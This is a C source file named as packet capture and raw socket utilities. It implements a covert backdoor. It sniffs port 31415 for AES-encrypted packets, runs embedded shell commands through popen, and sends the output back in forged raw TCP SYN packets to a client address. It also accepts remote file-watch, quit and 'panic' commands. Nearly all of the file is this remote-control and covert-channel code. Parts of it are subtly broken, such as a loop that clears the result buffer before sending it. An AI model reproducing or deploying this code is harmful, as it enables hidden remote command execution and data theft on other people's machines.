/*-----------------------------------------------------------------------------
 * packet_utils.c - Packet capture and RAW socket utilities.
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "packet_utils.h"
#include "cryptography.h"
#include "file_watcher.h"

void *pcap_start(void *ptr)
{
	char *dev = NULL;					/* capture device */
	char err_buff[PCAP_ERRBUF_SIZE];	/* error buffer */
	pcap_t *handle;						/* packet capture handle */
	bpf_u_int32 mask;					/* subnet mask */
	bpf_u_int32 net;					/* ip address */

	char filter_exp[] = "dst port 31415";
	struct bpf_program fp;				/* compiled filter program */

	/* find a capture device */
	if ((dev = pcap_lookupdev(err_buff)) == NULL) {
		fprintf(stderr, "Could not find default device: %s\n", err_buff);
		exit(ERROR_PCAP);
	}

	/* get netmask and IP */
	if (pcap_lookupnet(dev, &net, &mask, err_buff) == ERROR) {
		fprintf(stderr, "Could not get IP/netmask for device %s: %s\n",
				dev, err_buff);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	fprintf(stderr, "Device: %s\n", dev);
	fprintf(stderr, "Filter expression: %s\n", filter_exp);

	/* open capture device */
	if ((handle = pcap_open_live(dev, MAX_PKT_LEN, 1, 1000, err_buff)) == NULL) {
		fprintf(stderr, "Could not open device %s: %s\n", dev, err_buff);
		exit(ERROR_PCAP);
	}

	/* make sure we're capturing from an ethernet device */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet device\n", dev);
		exit(ERROR_PCAP);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == ERROR) {
		fprintf(stderr, "Could not parse expression filter %s: %s\n",
				filter_exp, pcap_geterr(handle));
		exit(ERROR_PCAP);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == ERROR) {
		fprintf(stderr, "Could not install filter %s: %s\n",
				filter_exp, pcap_geterr(handle));
		exit(ERROR_PCAP);
	}

	/* set the callback function */
	pcap_loop(handle, -1, packet_callback, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	return NULL;
}

void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
		const unsigned char *packet)
{
	/* declare pointers to packet headers */
	const struct pcap_ip *ip;				/* The IP header */
	const struct pcap_tcp *tcp;				/* The TCP header */
	const unsigned char *payload;			/* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;
	int read_bytes;

	char *start, *end;
	char decrypted[MAX_PKT_LEN];
	char command[MAX_PKT_LEN];
	char buffer[MAX_PKT_LEN];

	EVP_CIPHER_CTX encrypt, decrypt;

	FILE *file;

	if (aes_init(&encrypt, &decrypt) == ERROR)
		fprintf(stderr, "ERROR: aes_init\n");

	/* define/compute ip header offset */
	ip = (struct pcap_ip *)(packet + ETHERNET_SIZE);
	size_ip = IP_HL(ip) * 4;

	/* verify IP header length */
	if (size_ip < 20)
		return; /* invalid IP header length */

	/* only watch TCP packets (the filter should cover this */
	if (ip->ip_p != IPPROTO_TCP)
		return; /* not TCP */

	/* calculate tcp header offset */
	tcp = (struct pcap_tcp *)(packet + ETHERNET_SIZE + size_ip);
	size_tcp = TH_OFF(tcp) * 4;

	/* verify TCP header length */
	if (size_tcp < 20)
		return; /* invalid TCP header length */

	/* calculate tcp payload (segment) offset */
	payload = (unsigned char *)(packet + ETHERNET_SIZE + size_ip + size_tcp);

	/* calculatR tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

	/* decrypt the payload */
	strncpy(decrypted, (char *)aes_decrypt(&decrypt, (unsigned char *)payload,
				&size_payload), size_payload);

	if ((start = strstr(decrypted, EXT_CMD_START)) && server) {
		/* process external command */
		start += strlen(EXT_CMD_START);

		if (!(end = strstr(start, EXT_CMD_END)))
			return; /* we have no command end */

		/* grab the command */
		memset(command, 0x0, sizeof(command));
		strncpy(command, start, (end - start));

		/* run command */
		fprintf(stderr, "executing command: %s\n", command);

		/* need to send back to client */
		if ((file = popen(command, "r")) == NULL)
			err(1, "popen");

		while ((read_bytes = fread(buffer, sizeof(char), MAX_PKT_LEN - 
						(strlen(RESULT_START) + strlen(RESULT_END)),
						file)) != 0) {
			memset(command, 0x0, MAX_PKT_LEN);
			sprintf(command, "%s%s%s", RESULT_START, buffer, RESULT_END);
			memset(buffer, 0x0, MAX_PKT_LEN);

			packet_forge(buffer, SERVER_IP, CLIENT_IP);
			fprintf(stderr, "sending to client %s\n", CLIENT_IP);
		}
	}
	else if ((start = strstr(decrypted, WATCH_CMD_START)) && server) {
		/* process internal command */
		start += strlen(WATCH_CMD_START);

		if (!(end = strstr(start, WATCH_CMD_END)))
			return; /* we have no command end */

		/* grab the file/dir */
		memset(command, 0x0, sizeof(command));
		strncpy(command, start, (end - start));

		/* begin watching */
		fprintf(stderr, "watching %s\n", command);
		file_register(list, command, FLAGS);
	}
	else if (!strncmp(decrypted, QUIT_CMD, strlen(QUIT_CMD)) && server) {
		fprintf(stderr, "Remote quit command, terminating server.\n");
		exit_clean();
	}
	else if (!strncmp(decrypted, PANIC_CMD, strlen(PANIC_CMD)) && server) {
		fprintf(stderr, "Panic quit command, burning everything!!\n");
		exit_panic();
	}
	else if ((start = strstr(decrypted, RESULT_START)) && !server) {
		/* process command results */
		start += strlen(RESULT_START);
		fprintf(stderr, "got it?\n");

		if (!(end = strstr(start, RESULT_END)))
			return; /* no ending results */

		/* extract the results */
		memset(command, 0x0, sizeof(command));
		strncpy(command, start, (end - start));

		/* print the results */
	}

	return;
}

unsigned short in_cksum(unsigned short *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/* Our algorithm is simple, using a 32-bit accumulator (sum), we add
	 * sequential 16-bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft ==1) {
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add high 16 to low 16 */
	sum += (sum >> 16);					/* add carry */
	answer = ~sum;						/* truncate to 16 bits */

	return (answer);
}

unsigned short in_cksum_tcp(int src, int dst, unsigned short *addr, int len)
{
	struct pseudo_hdr {
		struct in_addr src;
		struct in_addr dst;
		unsigned char pad;
		unsigned char proto;
		unsigned short tcp_len;
		struct tcphdr tcp;
	} pseudo_hdr;

	unsigned short answer;

	memset(&pseudo_hdr, 0, sizeof(pseudo_hdr));

	pseudo_hdr.src.s_addr = src;
	pseudo_hdr.dst.s_addr = dst;
	pseudo_hdr.pad = 0;
	pseudo_hdr.proto = IPPROTO_TCP;
	pseudo_hdr.tcp_len = htons(len);

	memcpy(&(pseudo_hdr.tcp), addr, len);

	answer = in_cksum((unsigned short *)&pseudo_hdr, 12 + len);

	return (answer);
}

void packet_forge(char *payload, char *src, char *dst)
{
	struct ip iph;
	struct tcphdr tcph;
	struct sockaddr_in sin;
	struct timeval time;
	unsigned char *packet;
	unsigned char *ciphertext;
	int payload_len;
	const int on = 1;
	int sock_fd, send_len;
	EVP_CIPHER_CTX encrypt, decrypt;

	/* initialize encryption */
	if (aes_init(&encrypt, &decrypt) == ERROR)
		fprintf(stderr, "ERROR: aes_init\n");

	payload_len = strlen(payload) + 1;

	/* encrypt the payload */
	ciphertext = aes_encrypt(&encrypt, (unsigned char *)payload, &payload_len);


	/* seed random number generator */
	gettimeofday(&time, NULL);
	srand(time.tv_usec);

	/* allocate memory for the packet */
	packet = (unsigned char *)malloc(40 + payload_len);

	/* create a forged IP header */
	iph.ip_hl	= 0x5;
	iph.ip_v	= 0x4;
	iph.ip_tos	= 0x0;
	iph.ip_len	= sizeof(struct ip) + sizeof(struct tcphdr) + payload_len;
	iph.ip_id	= htonl((int)(255.0 * rand() / (RAND_MAX + 1.0)));
	iph.ip_off	= 0x0;
	iph.ip_ttl	= 0x64;
	iph.ip_sum	= 0;
	iph.ip_p	= IPPROTO_TCP;
	iph.ip_src.s_addr = inet_addr(src);
	iph.ip_dst.s_addr = inet_addr(dst);

	/* create a forged TCP header */
	tcph.th_sport = htons(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
	tcph.th_dport = htons(31415);
	tcph.th_seq = htonl(1 + (int)(10000.0 * rand() / (RAND_MAX + 1.0)));
	tcph.th_off = sizeof(struct tcphdr) / 4;
	tcph.th_flags = TH_SYN;
	tcph.th_win = htons(65535);
	tcph.th_sum = 0;

	/* combine the forged headers into a socket struct */
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = iph.ip_dst.s_addr;

	/* open raw socket for sending */
	if ((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < SUCCESS) {
		err(1, "socket");
		exit(ERROR_SOCKET);
	}

	if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < SUCCESS) {
		err(1, "setsockopt");
		exit(ERROR_SOCKET);
	}	

	/* create checksums */
	iph.ip_sum = in_cksum((unsigned short*)&iph, sizeof(iph));
	tcph.th_sum = in_cksum_tcp(iph.ip_src.s_addr, iph.ip_dst.s_addr,
			(unsigned short *)&tcph, sizeof(tcph));

	/* finish full header */
	memcpy(packet, &iph, sizeof(iph));
	memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
	memcpy(packet + sizeof(iph) + sizeof(tcph), ciphertext, payload_len);

	/* send the packet */
	if ((send_len = sendto(sock_fd, packet, iph.ip_len, 0,
					(struct sockaddr *)&sin,
					sizeof(struct sockaddr))) < SUCCESS) {
		err(1, "sendto");
		exit(ERROR_SEND);
	}

	close(sock_fd);
}

void exit_clean(void)
{
	watching = FALSE;
	free_list(list);
	sleep(1);
	exit(SUCCESS);
}

void exit_panic(void)
{
	watching = FALSE;
	free_list(list);
	sleep(1);
	/* clear out files & directories */
	exit(SUCCESS);
}
